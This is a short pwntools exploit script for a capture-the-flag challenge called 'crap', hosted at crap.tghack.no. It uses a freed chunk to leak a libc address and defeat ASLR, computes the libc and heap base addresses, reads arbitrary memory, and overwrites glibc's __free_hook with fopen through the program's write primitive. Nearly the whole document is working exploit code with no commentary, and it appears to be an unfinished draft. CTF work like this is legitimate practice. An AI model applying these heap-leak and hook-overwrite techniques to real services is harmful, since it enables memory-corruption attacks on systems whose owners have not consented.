from pwn import *
elf = ELF('./crap', checksec=False)
#libc = ELF('/opt/glibc/x64/2.31/lib/libc.so.6', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

def read_val(addr):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', b'0x%x' % addr)
    return p.recvline().strip()[7:]

def write_val(addr, data):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', b'0x%016x 0x%016x' % (addr, data))

def make_feedback(data, keep=b'y'):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', b'%s' % data)
    p.sendlineafter(b'(y/n)\n', b'%s' % keep)

def read_feedback():
    p.sendlineafter(b'>', b'4')
    return p.recvline().strip()[10:]

#p = elf.process()
p = remote('crap.tghack.no', 6001)
make_feedback(b'ABCD',b'n')
main_arena = u64(read_feedback().ljust(8,  b'\x00'))
libc.address = main_arena - (libc.sym['main_arena']+96)
heap = eval(read_val(libc.sym['mp_']+64+8))
#elf.address = libc.address + 0x12004e0
#elf.address = eval(read_val(elf.address)) # find elf base at ld.so

now=libc.address+0x3bb000+0x2000   # libseccomp

log.info('elf base       : 0x%x'%elf.address)
log.info('heap base      : 0x%x'%heap)
log.info('main_arena+96  : 0x%x'%main_arena)
log.info('libc base      : 0x%x'%libc.address)
log.info('libc base      : 0x%x'%(now))

print(read_val(now))
write_val(libc.sym['__free_hook'], libc.sym['fopen'])


p.interactive()